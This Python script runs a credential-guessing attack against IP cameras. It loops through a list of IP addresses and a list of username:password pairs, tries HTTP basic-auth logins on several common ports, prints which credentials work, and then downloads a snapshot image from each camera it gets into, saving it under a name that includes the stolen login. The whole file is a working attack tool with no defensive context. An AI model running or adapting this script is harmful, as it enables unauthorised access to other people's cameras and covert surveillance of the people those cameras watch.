import requests
from requests.auth import HTTPBasicAuth
import colorama
from colorama import Fore, Style
import os

colorama.init()

# ANSI color escape codes
GREEN = Fore.GREEN
RESET = Style.RESET_ALL
RED = Fore.RED

def read_ip_addresses(filename):
    with open(filename, 'r') as f:
        lines = f.readlines()
    return [line.strip() for line in lines]

def read_combined_file(filename):
    with open(filename, 'r') as f:
        lines = f.readlines()
    return [line.strip().split(':') for line in lines]

def check_ip_camera(ip, ports, username, password, use_https=False):
    protocol = "https" if use_https else "http"
    success = False
    error_msg = ""

    for port in ports:
        url = f"{protocol}://{ip}:{port}/status"
        try:
            response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10)
            if response.status_code == 200:
                success = True
                break
            else:
                error_msg = f"Error: {response.status_code}"
        except requests.exceptions.RequestException as e:
            error_msg = f"Error: {e}"

    return success, error_msg

def capture_screenshot(ip, username, password):
    protocol = "http"  # Assuming camera stream is served over HTTP
    url = f"{protocol}://{ip}/snapshot.jpg"  # Adjust URL to match camera's snapshot endpoint

    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), stream=True, timeout=20)
        if response.status_code == 200:
            # Create a folder if it doesn't exist
            folder_name = "screenshots"
            os.makedirs(folder_name, exist_ok=True)

            # Save the image as a PNG file in the folder
            file_name = f"{ip}_{username}_{password}.png"
            with open(os.path.join(folder_name, file_name), "wb") as file:
                file.write(response.content)
            print(f"Screenshot captured and saved as {folder_name}/{file_name}")
        else:
            print(f"{RED}Failed{RESET} to capture screenshot from {ip}. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}Error{RESET} capturing screenshot from {ip}: {e}")

if __name__ == "__main__":
    ips = read_ip_addresses('ips.txt')
    combined_credentials = read_combined_file('credentials.txt')
    ports = [80, 8080, 8000, 8001]  # Example list of ports to check

    for ip in ips:
        for credentials in combined_credentials:
            username, password = credentials
            success, error_msg = check_ip_camera(ip, ports, username, password)
            if success:
                print(f"IP: {ip}, Username: {username}, Password: {password} - {GREEN}Correct{RESET}.")
                capture_screenshot(ip, username, password)
            else:
                print(f"IP: {ip}, Username: {username}, Password: {password} - {RED}{error_msg}{RESET}")
